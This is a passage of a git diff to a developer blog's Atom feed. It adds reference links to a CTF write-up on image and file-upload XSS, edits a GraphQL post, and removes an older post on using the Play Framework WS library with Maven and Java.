+&lt;li&gt;&lt;a href=&quot;https://blackpentesters.blogspot.com.au/2013/08/gif-image-xss.html&quot;&gt;&amp;quot;GIF Image XSS&amp;quot; by eXpl0i13r&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://brutelogic.com.br/blog/file-upload-xss/&quot;&gt;File Upload XSS | Hack2Learn&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/List_of_file_signatures&quot;&gt;List of File Signatures | Wikipedia&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://github.com/d0lph1n98/Defeating-PHP-GD-imagecreatefromgif&quot;&gt;&amp;quot;Exploiting PHP-GD imagecreatefromgif() function&amp;quot; by d0lph1n98 &lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;Capturing Requests
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;TODO&quot;&gt;Request Bin&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>devalias</name></author><category term="hack" /><category term="ctf" /><category term="sectalks" /><category term="xss" /><category term="csrf" /><category term="file-upload" /><category term="image" /><category term="gif" /><category term="csp" /><category term="chrome" /><category term="safari" /><summary>I was playing around with the top challenge on the CTF at SecTalks the other night, and thought I&amp;#39;d do a quick writeup of some of the techniques required; for future reference, and to help others to learn.</summary></entry><entry><title>GraphQL: Why You Should Care</title><link href="http://devalias.net//devalias/2016/09/07/graphql-why-you-should-care/" rel="alternate" type="text/html" title="GraphQL: Why You Should Care" /><published>2016-09-07T00:00:00+10:00</published><updated>2016-09-07T00:00:00+10:00</updated><id>http://devalias.net//devalias/2016/09/07/graphql-why-you-should-care</id><content type="html" xml:base="http://devalias.net//devalias/2016/09/07/graphql-why-you-should-care/">&lt;p&gt;If you haven&amp;#39;t yet come across &lt;a href=&quot;http://graphql.org/&quot;&gt;GraphQL&lt;/a&gt;, it&amp;#39;s kind of exciting stuff. It&amp;#39;s a query language developed by &lt;a href=&quot;https://code.facebook.com/posts/&quot;&gt;Facebook&lt;/a&gt;, that basically lets you request exactly the data you need for the given task; no more, no less. Sounds good right?&lt;/p&gt;
 
 &lt;h2&gt;Tell me more..&lt;/h2&gt;
 
@@ -21,7 +185,7 @@
 &lt;li&gt;&lt;a href=&quot;https://medium.com/apollo-stack/tutorial-building-a-graphql-server-cddaa023c035&quot;&gt;&amp;quot;Tutorial: How to build a GraphQL server&amp;quot; by Jonas Helfer&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;h2&gt;GraphQL and Relay.. What about Redux?&lt;/h2&gt;
+&lt;h2&gt;&lt;a name=&quot;graphql-relay-redux&quot;&gt;&lt;/a&gt;GraphQL and Relay.. What about Redux?&lt;/h2&gt;
 
 &lt;p&gt;A lot of things you&amp;#39;ll read about GraphQL on the net will talk about it quite closely with &lt;a href=&quot;https://facebook.github.io/relay/&quot;&gt;Relay&lt;/a&gt;, and given they were both released by Facebook, and sort of designed to work together, it makes a lot of sense. That said, you most definitely don&amp;#39;t need to use Relay to take advantage of the awesomeness GraphQL provides!&lt;/p&gt;
 
@@ -44,6 +208,7 @@
 &lt;li&gt;&lt;a href=&quot;http://www.apollostack.com/&quot;&gt;Apollo Stack&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;https://github.com/mattkrick/cashay&quot;&gt;Cashay&lt;/a&gt;: &amp;quot;Relay for the rest of us&amp;quot;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;https://github.com/gyzerok/adrenaline&quot;&gt;Adrenaline&lt;/a&gt;: &amp;quot;Simple Relay alternative&amp;quot;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://github.com/kennetpostigo/react-reach&quot;&gt;React-Reach&lt;/a&gt;: &amp;quot;A small library for React to communicate with GraphQL&amp;quot;&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;h2&gt;GraphQL vs Falcor&lt;/h2&gt;
@@ -706,59 +871,4 @@ python -m SimpleHTTPServer 8000
 &lt;li&gt;Then push it to github: &lt;code&gt;git push -u origin gh-pages&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;&lt;/li&gt;
 &lt;li&gt;That&amp;#39;s pretty much it! After a short delay, your site should be available at &lt;a href=&quot;http://YOURUSERNAME.github.io/my-mdwiki&quot;&gt;http://YOURUSERNAME.github.io/my-mdwiki&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>devalias</name></author><category term="mdwiki" /><category term="wiki" /><category term="clientside" /><category term="tutorial" /><category term="markdown" /><category term="github" /><category term="gh-pages" /><summary>(Note: Original gist can be found here)</summary></entry><entry><title>Play! Framework - Seperated WS Library</title><link href="http://devalias.net//devalias/2014/06/26/play-framework-seperated-ws-library/" rel="alternate" type="text/html" title="Play! Framework - Seperated WS Library" /><published>2014-06-26T03:48:00+10:00</published><updated>2014-06-26T03:48:00+10:00</updated><id>http://devalias.net//devalias/2014/06/26/play-framework-seperated-ws-library</id><content type="html" xml:base="http://devalias.net//devalias/2014/06/26/play-framework-seperated-ws-library/">&lt;p&gt;So as we all (should) know, &lt;a href=&quot;https://www.playframework.com/&quot;&gt;Play! Framework&lt;/a&gt; has released &lt;a href=&quot;https://www.typesafe.com/blog/announcing-play-230&quot;&gt;v2.3.x&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;With it comes a &lt;a href=&quot;https://www.playframework.com/documentation/2.3.x/Highlights23&quot;&gt;whole range&lt;/a&gt; of new features, including one that caught my eye:&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;Play WS&lt;/p&gt;
-
-&lt;p&gt;Separate library&lt;/p&gt;
-
-&lt;p&gt;The WS client library has been refactored into its own library which can be used outside of Play. You can now have multiple WSClient objects, rather than only using the WS singleton.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;This was particularly exciting for me, as I&amp;#39;ve grown to know, understand and love the simple abstractions the Play WS library provides.&lt;/p&gt;
-
-&lt;p&gt;Sweet! So how do I get it in my projects? Had a look over at &lt;a href=&quot;https://github.com/playframework&quot;&gt;playframework@Github&lt;/a&gt; to no avail (was expecting a new repo)&lt;/p&gt;
-
-&lt;p&gt;After a little more digging, I came across the &lt;a href=&quot;https://www.playframework.com/documentation/2.3.x/Repositories&quot;&gt;Play! Repositories&lt;/a&gt; page, which lead me to finding what I wanted.&lt;/p&gt;
-
-&lt;p&gt;A little xml magic later and we have the following for a maven project wanting to use the Java version of the WS library:&lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;&amp;lt;dependencies&amp;gt;
-    &amp;lt;groupId&amp;gt;com.typesafe.play&amp;lt;/groupId&amp;gt;
-    &amp;lt;artifactId&amp;gt;play-java-ws_2.10&amp;lt;/artifactId&amp;gt;
-    &amp;lt;version&amp;gt;2.3.0&amp;lt;/version&amp;gt;
-&amp;lt;/dependencies&amp;gt;
-
-&amp;lt;repositories&amp;gt;
-    &amp;lt;id&amp;gt;Typesafe Releases&amp;lt;/id&amp;gt;
-    &amp;lt;url&amp;gt;http://repo.typesafe.com/typesafe/releases/&amp;lt;/url&amp;gt;
-&amp;lt;/repositories&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;Hope this saves you guys some time, and as always, happy hacking!&lt;/p&gt;
-
-&lt;h2&gt;&amp;quot;There is no started application&amp;quot;&lt;/h2&gt;
-
-&lt;p&gt;If you end up getting a &amp;quot;There is no started application&amp;quot; message when you try to use WS, you will need to do something like the following:&lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;AsyncHttpClientConfig.Builder builder = new com.ning.http.client.AsyncHttpClientConfig.Builder();
-NingWSClient wsClient = new play.libs.ws.ning.NingWSClient(builder.build());
-
-// Instead of this
-//WSRequestHolder ws = WS.url(url)
-
-// Use this
-WSRequestHolder ws = wsClient.url(url)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;See the following for more details:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;http://stackoverflow.com/questions/24881145/how-do-i-use-play-ws-library-in-normal-sbt-project-instead-of-play&quot;&gt;http://stackoverflow.com/questions/24881145/how-do-i-use-play-ws-library-in-normal-sbt-project-instead-of-play&lt;/a&gt;
-
-&lt;ul&gt;
-&lt;li&gt;Scala - Using WSClient: &lt;a href=&quot;http://www.playframework.com/documentation/2.3.x/ScalaWS&quot;&gt;http://www.playframework.com/documentation/2.3.x/ScalaWS&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;Java - Using WSClient: &lt;a href=&quot;http://www.playframework.com/documentation/2.3.x/JavaWS&quot;&gt;http://www.playframework.com/documentation/2.3.x/JavaWS&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;(Note: The tl;dr/raw/likely most up to date notes I made for this are &lt;a href=&quot;https://gist.github.com/alias1/288dce6b353f2a72a7d4&quot;&gt;available as a gist&lt;/a&gt;)&lt;/p&gt;</content><author><name>devalias</name></author><category term="play-framework" /><category term="2.3.x" /><category term="ws" /><category term="play-ws" /><category term="library" /><category term="maven" /><category term="typesafe" /><category term="playframework.com" /><category term="typesafe.com" /><summary>So as we all (should) know, Play! Framework has released v2.3.x</summary></entry></feed>
+&lt;/ul&gt;</content><author><name>devalias</name></author><category term="mdwiki" /><category term="wiki" /><category term="clientside" /><category term="tutorial" /><category term="markdown" /><category term="github" /><category term="gh-pages" /><summary>(Note: Original gist can be found here)</summary></entry></feed>
